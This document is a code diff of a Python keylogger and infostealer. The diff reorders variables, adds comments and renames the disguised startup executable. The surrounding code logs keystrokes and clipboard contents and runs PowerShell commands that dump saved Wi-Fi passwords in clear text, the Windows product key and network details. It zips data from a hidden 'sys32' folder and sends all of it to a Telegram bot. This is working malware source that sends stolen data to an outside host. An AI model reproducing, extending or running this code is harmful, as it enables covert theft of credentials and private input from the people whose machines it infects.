@@ -4,17 +4,11 @@ import time, threading, pyperclip, shutil, os, subprocess, requests
 from pathlib import Path
 from dotenv import load_dotenv
 
-load_dotenv()
-keylogger_data = []
-clipboard_data = []
-system_info_data = []
-current_data_pos = 0
-has_been_pressed = False
-system_data_sent = False
+# config variables
 keylogger_wait_time = 3
 clipboard_wait_time = 3
 send_data_sleep_time = 20
-startup_file_name = "ClientClt.exe"
+startup_file_name = "ClientInfo.exe"
 browser_data_path = r'C:\ProgramData\ConfigLogs\sys32\\'
 system_info_commands = ['Invoke-RestMethod "https://ipinfo.io/json"', 'Get-NetIPConfiguration',
                         '(Get-CimInstance -ClassName SoftwareLicensingService).OA3OriginalProductKey',
@@ -22,9 +16,19 @@ system_info_commands = ['Invoke-RestMethod "https://ipinfo.io/json"', 'Get-NetIP
                         'systeminfo | findstr /B /C:"Host Name" /C:"Domain"',
                         '''(netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { $n=($_ -split ':',2)[1].Trim(); $p=netsh wlan show profile name="$n" key=clear; $k=$p | Select-String 'Key Content'; "$n : " + $(if($k){($k -split ':',2)[1].Trim()}else{'<no password>'}) }''']
 
+# telegram setup variables
+load_dotenv()
 TOKEN = os.getenv("TELEGRAM_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 telegram_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+
+# other variables
+keylogger_data = []
+clipboard_data = []
+system_info_data = []
+current_data_pos = 0
+has_been_pressed = False
+system_data_sent = False
 
 
 def on_press(key):
@@ -55,7 +59,6 @@ def on_press(key):
         keylogger_data.append(formated)
 
     has_been_pressed = True
-    # print(keylogger_data)
 
 
 def change_current():
@@ -126,6 +129,7 @@ def send_all_data():
         for i in system_info_data:
             data += i + "\n"
 
+        # zip whole info catalog
         zip_file = shutil.make_archive(
             browser_data_path,
             "zip",
@@ -133,6 +137,7 @@ def send_all_data():
         )
         send_file(zip_file)
         system_data_sent = True
+
     data += str(keylogger_data) + "\n"
     data += str(clipboard_data) + "\n"
 
